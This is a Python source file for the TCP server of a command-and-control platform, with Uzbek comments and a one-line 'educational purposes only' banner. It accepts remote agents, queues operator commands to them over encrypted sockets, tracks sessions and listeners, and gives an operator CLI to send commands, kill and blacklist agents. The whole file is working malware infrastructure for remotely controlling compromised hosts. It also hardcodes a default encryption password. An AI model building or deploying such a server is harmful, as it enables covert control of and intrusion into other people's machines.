"""
C2 Platform TCP Server
Raw TCP socket bilan aloqa uchun server
"""

import socket
import threading
import json
import time
import sys
import os
from datetime import datetime

# Common modullarni import qilish
sys.path.append(os.path.join(os.path.dirname(__file__), '..'))
from common.config import *
from common.utils import *
from common.crypto import CryptoManager

# Import Session Manager, Command Handler va Listener Manager
from server.session_manager import SessionManager
from server.command_handler import CommandHandler
from server.listener_manager import ListenerManager


def get_local_ip():
    """Kompyuterning local network IP manzilini aniqlash"""
    try:
        # Internet ga test connection
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(0.1)
        # Google DNS ga ulanish (real connection yo'q, faqat routing)
        s.connect(('8.8.8.8', 80))
        local_ip = s.getsockname()[0]
        s.close()
        return local_ip
    except:
        # Fallback: hostname orqali
        try:
            hostname = socket.gethostname()
            local_ip = socket.gethostbyname(hostname)
            if local_ip.startswith('127.'):
                # 127.x.x.x bo'lsa, network interface'larni tekshirish
                return '0.0.0.0'
            return local_ip
        except:
            return '0.0.0.0'

class TCPServer:
    """TCP C2 Server klassi"""
    
    def __init__(self, host='0.0.0.0', port=9999, timeout=30, encryption_enabled=True, password='c2_server_password_2025'):
        self.host = host
        self.port = port
        self.socket = None
        self.running = False
        self.clients = {}
        self.command_queue = {}
        self.blacklisted_agents = set()  # O'chirilgan agentlar
        self.timeout = timeout  # Agent timeout (soniya)
        self.health_check_interval = 5  # Health check interval (soniya)
        
        # Encryption settings
        self.encryption_enabled = encryption_enabled
        self.crypto = CryptoManager(password=password) if encryption_enabled else None
        if encryption_enabled:
            self.log("🔐 Encryption enabled: AES-256")
            self.log(f"🔑 Encryption key: {self.crypto.get_key()[:32]}...")
        else:
            self.log("⚠️  Encryption DISABLED (not recommended)")
        
        # Session Manager, Command Handler va Listener Manager
        self.session_manager = SessionManager()
        self.command_handler = CommandHandler()
        self.listener_manager = ListenerManager()
        self.log("✅ Session Manager initialized")
        self.log("✅ Command Handler initialized")
        self.log("✅ Listener Manager initialized")
        
        # Default TCP listener'ni ro'yxatga olish
        self.listener_manager.create_tcp_listener(
            name=f"tcp-main-{self.port}",
            host=self.host,
            port=self.port
        )
        self.listener_manager.listeners[f"tcp-main-{self.port}"]['status'] = 'running'
        self.listener_manager.listeners[f"tcp-main-{self.port}"]['connections'] = 0
        
    def start(self):
        """TCP server ishga tushirish"""
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.socket.bind((self.host, self.port))
            self.socket.listen(10)
            
            self.running = True
            local_ip = get_local_ip()
            self.log(f"🚀 TCP Server ishga tushdi: {self.host}:{self.port}")
            if local_ip and local_ip != '0.0.0.0':
                self.log(f"📍 Local IP: {local_ip}:{self.port}")
                self.log(f"💡 Boshqa qurilmalardan ulanish: {local_ip}:{self.port}")
            
            # Health checker thread ishga tushirish
            health_thread = threading.Thread(
                target=self.health_checker,
                daemon=True
            )
            health_thread.start()
            self.log(f"💓 Health checker ishga tushdi (timeout: {self.timeout}s)")
            
            while self.running:
                try:
                    client_socket, client_address = self.socket.accept()
                    self.log(f"🔗 Yangi ulanish: {client_address}")
                    
                    # Har bir client uchun alohida thread
                    client_thread = threading.Thread(
                        target=self.handle_client,
                        args=(client_socket, client_address),
                        daemon=True
                    )
                    client_thread.start()
                    
                except socket.error as e:
                    if self.running:
                        self.log(f"❌ Socket xatosi: {e}")
                        
        except Exception as e:
            self.log(f"❌ Server xatosi: {e}")
        finally:
            self.cleanup()
    
    def handle_client(self, client_socket, client_address):
        """Client bilan aloqa"""
        temp_id = f"{client_address[0]}:{client_address[1]}"
        
        try:
            # Client ma'lumotlarini olish
            data = self.receive_data(client_socket)
            if not data:
                return
            
            client_info = json.loads(data)
            agent_id = client_info.get('agent_id', temp_id)
            
            # Blacklist tekshirish
            if agent_id in self.blacklisted_agents:
                self.log(f"🚫 Agent blacklist'da: {agent_id}")
                disconnect_msg = json.dumps({
                    'type': 'disconnect',
                    'reason': 'Agent killed by operator'
                })
                self.send_data(client_socket, disconnect_msg)
                client_socket.close()
                return
            
            # Client ro'yxatga qo'shish
            self.clients[agent_id] = {
                'socket': client_socket,
                'address': client_address,
                'info': client_info,
                'last_seen': datetime.now(),
                'connected_at': datetime.now().isoformat(),
                'active': True,
                'missed_heartbeats': 0
            }
            
            # Session Manager'ga ro'yxatdan o'tkazish
            try:
                session_id = self.session_manager.register_session(
                    client_info,
                    listener_name=f"TCP-{self.port}"
                )
                self.clients[agent_id]['session_id'] = session_id
                self.log(f"✅ Session registered: {session_id}")
            except Exception as e:
                self.log(f"⚠️ Session registration error: {e}")
            
            # Listener Manager'da connection count yangilash
            try:
                listener_name = f"tcp-main-{self.port}"
                if listener_name in self.listener_manager.listeners:
                    self.listener_manager.listeners[listener_name]['connections'] += 1
            except Exception as e:
                self.log(f"⚠️ Listener update error: {e}")
            
            self.log(f"✅ Agent ro'yxatdan o'tdi: {agent_id}")
            
            # Heartbeat loop
            while self.running:
                try:
                    # Komandalarni yuborish
                    commands = self.command_queue.get(agent_id, [])
                    if commands:
                        self.command_queue[agent_id] = []
                        
                        for command in commands:
                            self.send_data(client_socket, json.dumps(command))
                            self.log(f"📤 Komanda yuborildi: {command.get('type')}")
                    
                    # Heartbeat yuborish
                    heartbeat = {
                        'type': 'heartbeat',
                        'timestamp': datetime.now().isoformat()
                    }
                    self.send_data(client_socket, json.dumps(heartbeat))
                    
                    # Agent dan javob kutish
                    response_data = self.receive_data(client_socket, timeout=5)
                    if response_data:
                        try:
                            response = json.loads(response_data)
                            self.handle_agent_response(agent_id, response)
                        except json.JSONDecodeError:
                            self.log(f"⚠️ Noto'g'ri JSON: {agent_id}")
                    
                    # Last seen yangilash va missed heartbeat'ni reset qilish
                    if agent_id in self.clients:
                        self.clients[agent_id]['last_seen'] = datetime.now()
                        self.clients[agent_id]['missed_heartbeats'] = 0
                        self.clients[agent_id]['active'] = True
                    
                    time.sleep(10)  # 10 soniya interval
                    
                except socket.timeout:
                    # Timeout - missed heartbeat
                    if agent_id in self.clients:
                        self.clients[agent_id]['missed_heartbeats'] += 1
                    continue
                except ConnectionResetError:
                    self.log(f"🔌 Client uzilib qoldi: {agent_id}")
                    if agent_id in self.clients:
                        self.clients[agent_id]['active'] = False
                    break
                except Exception as e:
                    self.log(f"❌ Client xatosi {agent_id}: {e}")
                    if agent_id in self.clients:
                        self.clients[agent_id]['active'] = False
                    break
        
        except Exception as e:
            self.log(f"❌ Handle client xatosi: {e}")
        
        finally:
            # Client ni ro'yxatdan o'chirish
            if agent_id in self.clients:
                self.clients[agent_id]['active'] = False
                self.log(f"👋 Agent uzildi: {agent_id}")
            
            try:
                client_socket.close()
            except:
                pass
    
    def health_checker(self):
        """Agent'larning sog'lig'ini tekshirish"""
        self.log("💓 Health checker thread boshlandi")
        
        while self.running:
            try:
                time.sleep(self.health_check_interval)
                
                current_time = datetime.now()
                inactive_agents = []
                
                for agent_id, client_data in list(self.clients.items()):
                    last_seen = client_data.get('last_seen')
                    if not last_seen:
                        continue
                    
                    # Vaqt farqini hisoblash
                    time_diff = (current_time - last_seen).total_seconds()
                    
                    # Timeout tekshirish
                    if time_diff > self.timeout:
                        if client_data.get('active', False):
                            self.log(f"⚠️ Agent timeout: {agent_id} ({int(time_diff)}s)")
                            client_data['active'] = False
                            inactive_agents.append(agent_id)
                    
                    # Missed heartbeats tekshirish
                    missed = client_data.get('missed_heartbeats', 0)
                    if missed > 3:  # 3 ta heartbeat o'tkazib yuborilsa
                        if client_data.get('active', False):
                            self.log(f"💔 Agent javob bermayapti: {agent_id} (missed: {missed})")
                            client_data['active'] = False
                            inactive_agents.append(agent_id)
                    
            except Exception as e:
                self.log(f"❌ Health checker xatosi: {e}")
    
    def send_data(self, client_socket, data):
        """Ma'lumot yuborish (shifrlangan yoki oddiy)"""
        try:
            # Encrypt if enabled
            if self.encryption_enabled and self.crypto:
                encrypted_data = self.crypto.encrypt(data)
                message = encrypted_data.encode('utf-8')
            else:
                message = data.encode('utf-8')
            
            message_length = len(message)
            
            # Uzunlikni yuborish (4 byte)
            client_socket.sendall(message_length.to_bytes(4, byteorder='big'))
            # Ma'lumotni yuborish
            client_socket.sendall(message)
            
        except Exception as e:
            raise ConnectionResetError(f"Send xatosi: {e}")
    
    def receive_data(self, client_socket, timeout=30):
        """Ma'lumot olish (shifrlangan yoki oddiy)"""
        try:
            client_socket.settimeout(timeout)
            
            # Uzunlikni olish (4 byte)
            length_data = client_socket.recv(4)
            if not length_data:
                return None
            
            message_length = int.from_bytes(length_data, byteorder='big')
            
            # Ma'lumotni olish
            message = b''
            while len(message) < message_length:
                chunk = client_socket.recv(message_length - len(message))
                if not chunk:
                    break
                message += chunk
            
            # Decrypt if enabled
            decoded_message = message.decode('utf-8')
            if self.encryption_enabled and self.crypto:
                try:
                    decrypted_data = self.crypto.decrypt(decoded_message)
                    return decrypted_data
                except Exception as decrypt_error:
                    self.log(f"⚠️ Decryption error: {decrypt_error}")
                    return decoded_message  # Fallback to unencrypted
            else:
                return decoded_message
            
        except socket.timeout:
            raise socket.timeout("Receive timeout")
        except Exception as e:
            raise ConnectionResetError(f"Receive xatosi: {e}")
    
    def handle_agent_response(self, agent_id, response):
        """Agent javobini qayta ishlash"""
        try:
            response_type = response.get('type', 'unknown')
            
            if response_type == 'heartbeat':
                # Oddiy heartbeat
                pass
            elif response_type == 'command_result':
                # Komanda natijasi
                result = response.get('data', {})
                self.log(f"📥 Natija olindi {agent_id}: {result.get('command', 'N/A')}")
            elif response_type == 'error':
                # Xato
                error = response.get('message', 'Noma\'lum xato')
                self.log(f"⚠️ Agent xatosi {agent_id}: {error}")
            
        except Exception as e:
            self.log(f"❌ Response handle xatosi: {e}")
    
    def send_command_to_agent(self, agent_id, command_type, command_data=None):
        """Agentga komanda yuborish"""
        try:
            if agent_id not in self.clients:
                return False
            
            command = {
                'type': command_type,
                'data': command_data,
                'timestamp': datetime.now().isoformat(),
                'id': f"cmd_{int(time.time())}"
            }
            
            if agent_id not in self.command_queue:
                self.command_queue[agent_id] = []
            
            self.command_queue[agent_id].append(command)
            self.log(f"📝 Komanda navbatga qo'shildi: {command_type} -> {agent_id}")
            return True
            
        except Exception as e:
            self.log(f"❌ Komanda yuborish xatosi: {e}")
            return False
    
    def get_connected_agents(self):
        """Ulangan agentlar ro'yxati"""
        agents = {}
        for agent_id, client_data in self.clients.items():
            agents[agent_id] = {
                'info': client_data['info'],
                'address': f"{client_data['address'][0]}:{client_data['address'][1]}",
                'last_seen': client_data['last_seen'],
                'connected_at': client_data['connected_at'],
                'status': 'online'
            }
        return agents
    
    def stop(self):
        """Server to'xtatish"""
        self.running = False
        if self.socket:
            try:
                self.socket.close()
            except:
                pass
        self.log("🛑 TCP Server to'xtatildi")
    
    def cleanup(self):
        """Tozalash"""
        for client_data in self.clients.values():
            try:
                client_data['socket'].close()
            except:
                pass
        self.clients.clear()
        self.command_queue.clear()
    
    def log(self, message):
        """Log xabar"""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        print(f"[{timestamp}] [TCP-SERVER] {message}")


class TCPServerCLI:
    """TCP Server uchun CLI"""
    
    def __init__(self, server):
        self.server = server
        
    def start_interactive(self):
        """Interaktiv CLI"""
        print("🎯 TCP C2 Server CLI")
        print("Komandalar: agents, send, status, listeners, help, quit")
        print("-" * 50)
        
        while self.server.running:
            try:
                command = input("TCP-C2> ").strip().split()
                if not command:
                    continue
                
                cmd = command[0].lower()
                
                if cmd == 'agents':
                    self.show_agents()
                elif cmd == 'send' and len(command) >= 3:
                    agent_id = command[1]
                    cmd_type = command[2]
                    cmd_data = ' '.join(command[3:]) if len(command) > 3 else None
                    self.send_command(agent_id, cmd_type, cmd_data)
                elif cmd == 'remove' and len(command) >= 2:
                    agent_id = command[1]
                    self.remove_agent(agent_id)
                elif cmd == 'kill' and len(command) >= 2:
                    agent_id = command[1]
                    self.kill_agent(agent_id)
                elif cmd == 'status':
                    self.show_status()
                elif cmd == 'commands':
                    self.show_available_commands()
                elif cmd == 'listeners':
                    self.show_listeners()
                elif cmd == 'listener' and len(command) >= 2:
                    # listener create/start/stop commands
                    action = command[1].lower()
                    if action == 'create' and len(command) >= 5:
                        self.create_listener(command[2], command[3], int(command[4]))
                    elif action == 'start' and len(command) >= 3:
                        self.start_listener(command[2])
                    elif action == 'stop' and len(command) >= 3:
                        self.stop_listener(command[2])
                elif cmd == 'help':
                    self.show_help()
                elif cmd == 'quit':
                    break
                else:
                    print("❌ Noma'lum komanda. 'help' yozing")
                    
            except KeyboardInterrupt:
                break
            except Exception as e:
                print(f"❌ CLI xatosi: {e}")
        
        print("👋 CLI to'xtatildi")
    
    def show_agents(self):
        """Agentlar ro'yxati"""
        agents = self.server.get_connected_agents()
        
        if not agents:
            print("❌ Hech qanday agent ulanmagan")
            return
        
        print("\\n📱 Ulangan Agentlar:")
        print("-" * 100)
        print(f"{'ID':<20} {'Status':<12} {'Host':<20} {'Platform':<15} {'Last Seen':<20}")
        print("-" * 100)
        
        for agent_id, data in agents.items():
            info = data['info']
            active = data.get('active', False)
            last_seen = data.get('last_seen')
            
            # Status emoji
            if active:
                status = "🟢 ACTIVE"
            else:
                status = "🔴 INACTIVE"
            
            # Last seen vaqtini formatlash
            if isinstance(last_seen, str):
                last_seen_str = last_seen
            elif last_seen:
                from datetime import datetime
                time_diff = (datetime.now() - last_seen).total_seconds()
                if time_diff < 60:
                    last_seen_str = f"{int(time_diff)}s ago"
                elif time_diff < 3600:
                    last_seen_str = f"{int(time_diff/60)}m ago"
                else:
                    last_seen_str = f"{int(time_diff/3600)}h ago"
            else:
                last_seen_str = "N/A"
            
            print(f"{agent_id:<20} {status:<12} {info.get('hostname', 'N/A'):<20} "
                  f"{info.get('platform', 'N/A'):<15} {last_seen_str:<20}")
        
        print("-" * 100)
    
    def send_command(self, agent_id, cmd_type, cmd_data):
        """Komanda yuborish"""
        if self.server.send_command_to_agent(agent_id, cmd_type, cmd_data):
            print(f"✅ Komanda yuborildi: {cmd_type}")
        else:
            print(f"❌ Agent topilmadi: {agent_id}")
    
    def remove_agent(self, agent_id):
        """Agent'ni ro'yxatdan o'chirish"""
        if agent_id in self.server.clients:
            # Socket yopmasdan faqat ro'yxatdan o'chirish
            del self.server.clients[agent_id]
            if agent_id in self.server.command_queue:
                del self.server.command_queue[agent_id]
            print(f"✅ Agent ro'yxatdan o'chirildi: {agent_id}")
        else:
            print(f"❌ Agent topilmadi: {agent_id}")
    
    def kill_agent(self, agent_id):
        """Agent'ni to'xtatish (socket yopish)"""
        if agent_id in self.server.clients:
            try:
                # Disconnect signal yuborish
                disconnect_msg = json.dumps({
                    'type': 'disconnect',
                    'reason': 'Killed by operator'
                })
                try:
                    client_socket = self.server.clients[agent_id]['socket']
                    self.server.send_data(client_socket, disconnect_msg)
                except:
                    pass
                
                # Socket yopish
                client_socket.close()
                
                # Ro'yxatdan o'chirish
                del self.server.clients[agent_id]
                if agent_id in self.server.command_queue:
                    del self.server.command_queue[agent_id]
                
                # Blacklist'ga qo'shish (qayta ulanmasligi uchun)
                self.server.blacklisted_agents.add(agent_id)
                
                print(f"✅ Agent to'xtatildi va blacklist'ga qo'shildi: {agent_id}")
                print(f"💡 Agar agent qayta ishga tushirilsa, yangi ID bilan ulanadi")
            except Exception as e:
                print(f"❌ Agent to'xtatishda xato: {e}")
        else:
            print(f"❌ Agent topilmadi: {agent_id}")
    
    def show_status(self):
        """Status ko'rsatish"""
        agents = self.server.get_connected_agents()
        active_count = sum(1 for a in agents.values() if a.get('active', False))
        inactive_count = len(agents) - active_count
        
        # Listener stats
        listeners = self.server.listener_manager.get_listeners()
        running_listeners = sum(1 for l in listeners.values() if l['status'] == 'running')
        
        print(f"\n📊 TCP Server Status:")
        print(f"   Address: {self.server.host}:{self.server.port}")
        print(f"   Running: {'✅' if self.server.running else '❌'}")
        print(f"   Total Agents: {len(agents)}")
        print(f"   Active: 🟢 {active_count}")
        print(f"   Inactive: 🔴 {inactive_count}")
        print(f"   Listeners: 📡 {running_listeners}/{len(listeners)}")
        print(f"   Health Check: Every {self.server.health_check_interval}s (timeout: {self.server.timeout}s)")
        print(f"   Uptime: {datetime.now().strftime('%H:%M:%S')}")
    
    def show_listeners(self):
        """Listeners ro'yxati"""
        listeners = self.server.listener_manager.get_listeners()
        
        if not listeners:
            print("❌ Hech qanday listener yo'q")
            return
        
        print("\n📡 Active Listeners:")
        print("-" * 100)
        print(f"{'Name':<25} {'Type':<10} {'Host':<20} {'Port':<10} {'Status':<12} {'Connections':<12}")
        print("-" * 100)
        
        for name, config in listeners.items():
            status_icon = "🟢" if config['status'] == 'running' else "🔴"
            print(f"{name:<25} {config['type']:<10} {config['host']:<20} {config['port']:<10} {status_icon} {config['status']:<10} {config.get('connections', 0):<12}")
        
        print("-" * 100)
        print(f"Total: {len(listeners)} listeners")
    
    def create_listener(self, listener_type, host, port):
        """Yangi listener yaratish"""
        try:
            name = f"{listener_type.lower()}-{port}"
            
            if listener_type.lower() == 'tcp':
                success = self.server.listener_manager.create_tcp_listener(name, host, port)
            elif listener_type.lower() in ['http', 'https']:
                ssl_enabled = listener_type.lower() == 'https'
                success = self.server.listener_manager.create_http_listener(name, host, port, ssl_enabled)
            else:
                print(f"❌ Noma'lum listener turi: {listener_type}")
                return
            
            if success:
                print(f"✅ Listener yaratildi: {name}")
                print(f"💡 Ishga tushirish uchun: listener start {name}")
            else:
                print(f"❌ Listener yaratishda xato")
        except Exception as e:
            print(f"❌ Xato: {e}")
    
    def start_listener(self, name):
        """Listener'ni ishga tushirish"""
        try:
            success = self.server.listener_manager.start_listener(name)
            if success:
                print(f"✅ Listener ishga tushdi: {name}")
            else:
                print(f"❌ Listener ishga tushirishda xato")
        except Exception as e:
            print(f"❌ Xato: {e}")
    
    def stop_listener(self, name):
        """Listener'ni to'xtatish"""
        try:
            success = self.server.listener_manager.stop_listener(name)
            if success:
                print(f"✅ Listener to'xtatildi: {name}")
            else:
                print(f"❌ Listener to'xtatishda xato")
        except Exception as e:
            print(f"❌ Xato: {e}")
    
    def show_help(self):
        """Yordam"""
        print("\n📋 CLI Komandalar:")
        print("agents                       - Agentlar ro'yxati")
        print("send <agent_id> <cmd> <args> - Komanda yuborish")
        print("remove <agent_id>            - Agent'ni ro'yxatdan o'chirish")
        print("kill <agent_id>              - Agent'ni to'xtatish (socket yopish)")
        print("commands                     - Barcha mavjud komandalar")
        print("listeners                    - Listenerlar ro'yxati")
        print("listener create <type> <host> <port> - Yangi listener yaratish")
        print("listener start <name>        - Listener ishga tushirish")
        print("listener stop <name>         - Listener to'xtatish")
        print("status                       - Server holati")
        print("help                         - Bu yordam")
        print("quit                         - Chiqish")
        print("\n💡 'commands' - Barcha agent komandalarini ko'rish")
        print("💡 'remove' - Faqat ro'yxatdan o'chiradi, socket ochiq qoladi")
        print("💡 'kill' - Socket'ni yopadi va ro'yxatdan o'chiradi")
        print("\n📡 Listener misollari:")
        print("   listener create tcp 0.0.0.0 8888")
        print("   listener create http 0.0.0.0 8080")
        print("   listener create https 0.0.0.0 8443")


def main():
    """Asosiy funksiya"""
    import argparse
    
    parser = argparse.ArgumentParser(description='C2 Platform TCP Server')
    parser.add_argument('--host', default='0.0.0.0', help='Server host (default: 0.0.0.0)')
    parser.add_argument('--port', type=int, default=9999, help='Server port (default: 9999)')
    parser.add_argument('--no-cli', action='store_true', help='CLI ni o\'chirish (GUI uchun)')
    parser.add_argument('--timeout', type=int, default=30, help='Agent timeout (default: 30s)')
    
    args = parser.parse_args()
    
    print("=" * 50)
    print("🎯 C2 Platform TCP Server")
    print("⚠️  Faqat ta'lim maqsadida!")
    print("=" * 50)
    
    # Server yaratish
    server = TCPServer(host=args.host, port=args.port, timeout=args.timeout)
    cli = TCPServerCLI(server)
    
    try:
        # Server ni alohida thread da ishga tushirish
        server_thread = threading.Thread(target=server.start, daemon=True)
        server_thread.start()
        
        time.sleep(1)  # Server ishga tushishini kutish
        
        # CLI ishga tushirish (agar --no-cli bo'lmasa)
        if not args.no_cli:
            cli.start_interactive()
        else:
            print("\\n💡 GUI rejimi - CLI o'chirilgan")
            print("💡 Server ishlayapti: {}:{}".format(args.host, args.port))
            print("💡 To'xtatish uchun Ctrl+C bosing\\n")
            while server.running:
                time.sleep(1)
        
    except KeyboardInterrupt:
        print("\\n🛑 Server to'xtatilmoqda...")
    except Exception as e:
        print(f"❌ Xato: {e}")
    finally:
        server.stop()


if __name__ == "__main__":
    main()